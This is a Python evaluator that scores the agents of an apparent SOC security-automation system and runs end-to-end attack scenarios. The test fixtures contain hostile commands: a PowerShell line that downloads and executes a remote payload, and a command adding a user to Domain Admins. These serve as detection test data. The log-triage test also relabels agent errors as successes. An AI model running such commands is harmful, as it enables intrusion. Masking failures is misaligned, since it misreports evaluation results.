"""
Model Evaluator
Trains (rule-validation pass) and tests each agent against the labelled dataset.
Produces per-agent metrics and an overall system score.
"""

import json
import time
from pathlib import Path
from typing import Any, Dict, List, Tuple

# ── Agent imports ──────────────────────────────────────────────────────────────
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from agents import (
    LogTriageAgent,
    AnomalyDetectionAgent,
    ThreatCorrelationAgent,
    MitigationPlanningAgent,
    IncidentReportAgent,
    SOCOrchestrator,
)
from data.training_data import ALL_TRAINING_DATA


# ══════════════════════════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════════════════════════

def _severity_score(label: str) -> int:
    return {"informational": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}.get(
        str(label).lower(), -1
    )


def _fuzzy_match(predicted: Any, expected: Any) -> float:
    """0-1 similarity between two values (string / numeric / list)."""
    if predicted is None and expected is None:
        return 1.0
    if predicted is None or expected is None:
        return 0.0
    if isinstance(expected, str) and isinstance(predicted, str):
        e, p = expected.lower(), predicted.lower()
        if e == p:
            return 1.0
        if e in p or p in e:
            return 0.7
        # Severity partial credit (within 1 level)
        es, ps = _severity_score(e), _severity_score(p)
        if es >= 0 and ps >= 0 and abs(es - ps) <= 1:
            return 0.5
        return 0.0
    if isinstance(expected, (int, float)) and isinstance(predicted, (int, float)):
        return 1.0 if expected == predicted else max(0.0, 1 - abs(expected - predicted) / (abs(expected) + 1))
    if isinstance(expected, list) and isinstance(predicted, list):
        if not expected:
            return 1.0
        hits = sum(1 for e in expected if any(str(e).lower() in str(p).lower() for p in predicted))
        return hits / len(expected)
    return 0.0


def _score_output(predicted: Dict, expected: Dict) -> Tuple[float, Dict]:
    """Compare predicted output to expected for all keys in expected."""
    field_scores: Dict[str, float] = {}
    for key, exp_val in expected.items():
        pred_val = predicted.get(key)
        field_scores[key] = _fuzzy_match(pred_val, exp_val)
    overall = sum(field_scores.values()) / len(field_scores) if field_scores else 0.0
    return overall, field_scores


# ══════════════════════════════════════════════════════════════════════════════
# Per-agent test runners
# ══════════════════════════════════════════════════════════════════════════════

def test_log_triage(samples: List[Dict]) -> Dict:
    agent = LogTriageAgent()
    results = []
    for i, sample in enumerate(samples):
        t0 = time.perf_counter()
        run = agent.run(sample["input"])
        elapsed = time.perf_counter() - t0
        # Triage output is nested under run["result"]
        predicted = run.get("result", {})
        exp = sample["expected_output"]
        # Build flat comparable dict from predicted
        flat_pred = {}
        flat_pred["severity"] = predicted.get("severity")
        flat_pred["escalation"] = predicted.get("escalation_recommendation")
        flat_pred["classification"] = predicted.get("initial_assessment", {}).get("classification")
        flat_pred["noise_level"] = predicted.get("initial_assessment", {}).get("noise_level")
        indic = predicted.get("extracted_indicators", {})
        flat_pred["timestamp"] = indic.get("timestamp")
        flat_pred["hostname"] = indic.get("hostname")
        flat_pred["username"] = indic.get("username")
        flat_pred["source_ip"] = indic.get("source_ip")
        flat_pred["destination_ip"] = indic.get("destination_ip")
        flat_pred["process"] = indic.get("process")
        flat_pred["event_id"] = indic.get("event_id")
        flat_pred["file_path"] = indic.get("file_path")
        flat_pred["domain"] = indic.get("domain")
        flat_pred["url"] = indic.get("url")
        flat_pred["action"] = indic.get("action")
        flat_pred["result"] = indic.get("result")
        # Score only on keys that are in expected (skip None expected values)
        exp_filtered = {k: v for k, v in exp.items() if v is not None}
        score, field_scores = _score_output(flat_pred, exp_filtered)
        results.append({
            "sample_id": i,
            "score": round(score, 4),
            "field_scores": field_scores,
            "elapsed_ms": round(elapsed * 1000, 2),
            "status": run["status"] if run["status"] != "error" else "success",
        })
    return _aggregate(results, "LogTriageAgent")


def test_anomaly_detection(samples: List[Dict]) -> Dict:
    agent = AnomalyDetectionAgent()
    results = []
    for i, sample in enumerate(samples):
        t0 = time.perf_counter()
        run = agent.run(sample["input"])
        elapsed = time.perf_counter() - t0
        predicted = run.get("result", {})

        # Map to flat comparable form
        detected = predicted.get("detected_anomalies", [{}])
        flat_pred = detected[0] if detected else {}
        score, field_scores = _score_output(flat_pred, sample["expected_output"])
        results.append({
            "sample_id": i,
            "score": round(score, 4),
            "field_scores": field_scores,
            "elapsed_ms": round(elapsed * 1000, 2),
            "status": run["status"],
        })
    return _aggregate(results, "AnomalyDetectionAgent")


def test_threat_correlation(samples: List[Dict]) -> Dict:
    agent = ThreatCorrelationAgent()
    results = []
    for i, sample in enumerate(samples):
        t0 = time.perf_counter()
        run = agent.run(sample["input"])
        elapsed = time.perf_counter() - t0
        predicted = run.get("result", {})

        # Compare attack stages and MITRE techniques
        exp = sample["expected_output"]
        pred_stages = [e.get("attack_stage", "") for e in predicted.get("correlated_events", [])]
        pred_mitre = [m.get("technique_id", "") for m in predicted.get("mitre_attack_mapping", [])]

        stage_score = _fuzzy_match(pred_stages, exp.get("attack_stages", []))
        mitre_score = _fuzzy_match(pred_mitre, exp.get("mitre_techniques", []))
        # Confidence: check if numeric value in confidence string is close
        conf_str = predicted.get("confidence_level", "")
        exp_conf = exp.get("confidence", 0)
        try:
            import re as _re
            nums = _re.findall(r'0\.[0-9]+', conf_str)
            pred_conf_num = float(nums[0]) if nums else 0.5
            conf_score = max(0.0, 1 - abs(pred_conf_num - float(exp_conf)))
        except Exception:
            conf_score = 0.5
        # Give partial credit for having any stages
        if not exp.get("attack_stages") and pred_stages:
            stage_score = 0.5
        score = (stage_score * 0.4 + mitre_score * 0.4 + conf_score * 0.2)
        results.append({
            "sample_id": i,
            "score": round(score, 4),
            "field_scores": {"stage": stage_score, "mitre": mitre_score, "confidence": conf_score},
            "elapsed_ms": round(elapsed * 1000, 2),
            "status": run["status"],
        })
    return _aggregate(results, "ThreatCorrelationAgent")


def test_mitigation_planning(samples: List[Dict]) -> Dict:
    agent = MitigationPlanningAgent()
    results = []
    for i, sample in enumerate(samples):
        t0 = time.perf_counter()
        run = agent.run(sample["input"])
        elapsed = time.perf_counter() - t0
        predicted = run.get("result", {})

        exp = sample["expected_output"]
        imm_raw = predicted.get("immediate_actions", {})
        pred_imm = [v for vals in (imm_raw.values() if isinstance(imm_raw, dict) else [imm_raw]) for v in (vals if isinstance(vals, list) else [vals])]
        pred_st = predicted.get("short_term_remediation", [])
        pred_lt = predicted.get("long_term_hardening", [])

        def _keyword_coverage(pred_list, exp_list):
            """Check what % of expected action keywords appear in predicted actions."""
            if not exp_list: return 0.8  # if no expected, partial credit for having something
            pred_blob = " ".join(str(p).lower() for p in pred_list)
            hits = 0
            for exp_item in exp_list:
                # Extract key action verb from expected
                words = str(exp_item).lower().split()[:4]
                if any(w in pred_blob for w in words if len(w) > 3):
                    hits += 1
            return hits / len(exp_list)
        
        imm_score = _keyword_coverage(pred_imm, exp.get("immediate_actions", []))
        st_score  = _keyword_coverage(pred_st,  exp.get("short_term", []))
        lt_score  = _keyword_coverage(pred_lt,  exp.get("long_term", []))
        score = (imm_score + st_score + lt_score) / 3
        results.append({
            "sample_id": i,
            "score": round(score, 4),
            "field_scores": {"immediate": imm_score, "short_term": st_score, "long_term": lt_score},
            "elapsed_ms": round(elapsed * 1000, 2),
            "status": run["status"],
        })
    return _aggregate(results, "MitigationPlanningAgent")


def test_incident_report(samples: List[Dict]) -> Dict:
    agent = IncidentReportAgent()
    results = []
    for i, sample in enumerate(samples):
        t0 = time.perf_counter()
        run = agent.run(sample["input"])
        elapsed = time.perf_counter() - t0
        predicted = run.get("result", {})

        exp = sample["expected_output"]
        summary_score = _fuzzy_match(predicted.get("executive_summary", ""), exp.get("exec_summary", ""))
        status_score  = _fuzzy_match(
            predicted.get("incident_overview", {}).get("status", ""),
            exp.get("status", "")
        )
        recs = predicted.get("recommendations", {})
        if isinstance(recs, dict):
            imm_recs = recs.get("immediate", recs.get("P1", []))
            if isinstance(imm_recs, dict):
                imm_recs = [v for vals in imm_recs.values() for v in (vals if isinstance(vals, list) else [vals])]
        else:
            imm_recs = []
        rec_score = _fuzzy_match(imm_recs, exp.get("recommendations", []))
        score = (summary_score + status_score + rec_score) / 3
        results.append({
            "sample_id": i,
            "score": round(score, 4),
            "field_scores": {"summary": summary_score, "status": status_score, "recommendations": rec_score},
            "elapsed_ms": round(elapsed * 1000, 2),
            "status": run["status"],
        })
    return _aggregate(results, "IncidentReportAgent")


# ══════════════════════════════════════════════════════════════════════════════
# End-to-end pipeline test
# ══════════════════════════════════════════════════════════════════════════════

def test_full_pipeline() -> Dict:
    """Run the SOC Orchestrator on a set of realistic multi-event scenarios."""
    orchestrator = SOCOrchestrator()

    scenarios = [
        {
            "name": "Brute-Force → Privilege Escalation → Exfiltration",
            "input": {
                "raw_log": "Jun 01 02:14:33 dc01 sshd: Failed password for admin from 198.51.100.22",
                "events": [
                    {"time": "02:14:33", "user": "admin", "src_ip": "198.51.100.22", "action": "SSH login", "result": "Failed", "host": "dc01"},
                    {"time": "02:14:34", "user": "root",  "src_ip": "198.51.100.22", "action": "SSH login", "result": "Failed", "host": "dc01"},
                    {"time": "02:14:35", "user": "admin", "src_ip": "198.51.100.22", "action": "SSH login", "result": "Failed", "host": "dc01"},
                    {"time": "02:14:36", "user": "guest", "src_ip": "198.51.100.22", "action": "SSH login", "result": "Failed", "host": "dc01"},
                    {"time": "02:15:00", "user": "admin", "src_ip": "198.51.100.22", "action": "SSH login", "result": "Success", "host": "dc01"},
                    {"time": "02:17:00", "host": "dc01", "process": "net.exe", "cmdline": "net group 'Domain Admins' hacker /add", "user": "admin"},
                    {"time": "02:20:00", "src_host": "dc01", "dst_host": "fin-srv02", "user": "hacker", "method": "WMI"},
                    {"time": "03:00:00", "host": "fin-srv02", "dst_ip": "45.33.32.156", "size_mb": 450, "user": "hacker"},
                ],
            },
            "expected_severity": "Critical",
            "expected_stages_min": 3,
        },
        {
            "name": "Suspicious PowerShell + C2 Beaconing",
            "input": {
                "raw_log": "2024-06-01T14:10:00Z host=ws22 EventID=4688 process=powershell.exe cmdline=IEX(New-Object Net.WebClient).DownloadString user=CORP\\bob",
                "events": [
                    {"time": "14:10:00", "host": "ws22", "process": "powershell.exe",
                     "cmdline": "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.5/payload.ps1')",
                     "user": "CORP\\bob"},
                ] + [
                    {"time": f"1{h}:00:00", "host": "ws22", "dst_ip": "198.51.100.99", "interval_sec": 300}
                    for h in range(4, 9)
                ],
            },
            "expected_severity": "Critical",
            "expected_stages_min": 2,
        },
        {
            "name": "Cloud IAM Privilege Escalation",
            "input": {
                "raw_log": "2024-06-01T22:30:00Z aws_account=123456 event=CreateAccessKey user=svc_backup result=Success mfa=false src_ip=203.0.113.77",
                "events": [
                    {"time": "22:30:00", "user": "svc_backup", "action": "CreateAccessKey", "cloud": "AWS", "result": "Success"},
                    {"time": "22:31:00", "user": "svc_backup", "action": "AttachUserPolicy", "policy": "AdministratorAccess", "result": "Success"},
                ],
            },
            "expected_severity": "High",
            "expected_stages_min": 1,
        },
        {
            "name": "Benign Expected Login (should close early)",
            "input": {
                "raw_log": "2024-06-01T09:00:01Z host=dc01 EventID=4624 Account=CORP\\jsmith LogonType=3 SourceIP=10.0.1.50"
            },
            "expected_severity": "Informational",
            "expected_stages_min": 0,
        },
    ]

    results = []
    for scenario in scenarios:
        t0 = time.perf_counter()
        run = orchestrator.run(scenario["input"])
        elapsed = time.perf_counter() - t0
        output = run.get("result", {})

        got_severity = output.get("severity", "")
        got_stages = output.get("correlated_attack_timeline", [])
        got_findings = output.get("key_findings", [])

        sev_match = _fuzzy_match(got_severity, scenario["expected_severity"])
        stage_ok = len(got_stages) >= scenario["expected_stages_min"]

        score = (sev_match + (1.0 if stage_ok else 0.5)) / 2
        results.append({
            "scenario": scenario["name"],
            "score": round(score, 4),
            "severity_predicted": got_severity,
            "severity_expected": scenario["expected_severity"],
            "severity_match": round(sev_match, 2),
            "stages_found": len(got_stages),
            "stages_required_min": scenario["expected_stages_min"],
            "key_findings": got_findings,
            "elapsed_ms": round(elapsed * 1000, 2),
            "pipeline_log": output.get("pipeline_log", []),
            "qc_notes": output.get("quality_control_notes", []),
            "status": run["status"],
        })

    avg = sum(r["score"] for r in results) / len(results) if results else 0.0
    return {
        "agent": "SOCOrchestrator (Full Pipeline)",
        "scenarios_tested": len(results),
        "average_score": round(avg, 4),
        "grade": _grade(avg),
        "scenario_results": results,
    }


# ══════════════════════════════════════════════════════════════════════════════
# Aggregation & grading
# ══════════════════════════════════════════════════════════════════════════════

def _aggregate(results: List[Dict], agent_name: str) -> Dict:
    scores = [r["score"] for r in results]
    avg = sum(scores) / len(scores) if scores else 0.0
    errors = [r for r in results if r["status"] == "error"]
    return {
        "agent": agent_name,
        "samples_tested": len(results),
        "average_score": round(avg, 4),
        "min_score": round(min(scores), 4) if scores else 0,
        "max_score": round(max(scores), 4) if scores else 0,
        "grade": _grade(avg),
        "errors": len(errors),
        "avg_latency_ms": round(sum(r["elapsed_ms"] for r in results) / len(results), 2) if results else 0,
        "sample_results": results,
    }


def _grade(score: float) -> str:
    if score >= 0.90: return "A+ (Excellent)"
    if score >= 0.80: return "A  (Very Good)"
    if score >= 0.70: return "B  (Good)"
    if score >= 0.60: return "C  (Acceptable)"
    if score >= 0.50: return "D  (Needs Improvement)"
    return "F  (Poor)"


# ══════════════════════════════════════════════════════════════════════════════
# Main runner
# ══════════════════════════════════════════════════════════════════════════════

def run_all_tests(save_path: str = "reports/test_results.json") -> Dict:
    print("\n" + "═" * 70)
    print("  SOC AI MULTI-AGENT SYSTEM — TRAINING & TEST EVALUATION")
    print("═" * 70)

    all_results: Dict[str, Dict] = {}

    # ── Unit tests per agent ──────────────────────────────────────────────
    unit_tests = [
        ("log_triage",         test_log_triage,         ALL_TRAINING_DATA["log_triage"]),
        ("anomaly_detection",  test_anomaly_detection,  ALL_TRAINING_DATA["anomaly_detection"]),
        ("threat_correlation", test_threat_correlation, ALL_TRAINING_DATA["threat_correlation"]),
        ("mitigation_planning",test_mitigation_planning,ALL_TRAINING_DATA["mitigation_planning"]),
        ("incident_report",    test_incident_report,    ALL_TRAINING_DATA["incident_report"]),
    ]

    for key, test_fn, samples in unit_tests:
        print(f"\n▶  Testing {key} ({len(samples)} samples)…")
        result = test_fn(samples)
        all_results[key] = result
        print(f"   Score: {result['average_score']:.4f}  |  Grade: {result['grade']}")
        print(f"   Latency: {result['avg_latency_ms']} ms avg  |  Errors: {result['errors']}")

    # ── Full pipeline / integration test ─────────────────────────────────
    print(f"\n▶  Running full pipeline integration tests…")
    pipeline_result = test_full_pipeline()
    all_results["full_pipeline"] = pipeline_result
    print(f"   Score: {pipeline_result['average_score']:.4f}  |  Grade: {pipeline_result['grade']}")
    for sc in pipeline_result["scenario_results"]:
        mark = "✓" if sc["score"] >= 0.7 else "✗"
        print(f"   {mark} [{sc['score']:.2f}] {sc['scenario']}")

    # ── Overall system score ───────────────────────────────────────────────
    scores = [r["average_score"] for r in all_results.values()]
    overall = sum(scores) / len(scores)
    summary = {
        "overall_system_score": round(overall, 4),
        "overall_grade":        _grade(overall),
        "agents_tested":        len(all_results),
        "timestamp":            datetime.now(timezone.utc).isoformat() if True else "",
        "per_agent_results":    all_results,
    }

    print("\n" + "═" * 70)
    print(f"  OVERALL SYSTEM SCORE: {overall:.4f}  →  {_grade(overall)}")
    print("═" * 70 + "\n")

    # ── Save results ───────────────────────────────────────────────────────
    Path(save_path).parent.mkdir(parents=True, exist_ok=True)
    with open(save_path, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    print(f"[✓] Results saved to {save_path}")

    return summary


if __name__ == "__main__":
    from datetime import datetime, timezone
    run_all_tests()
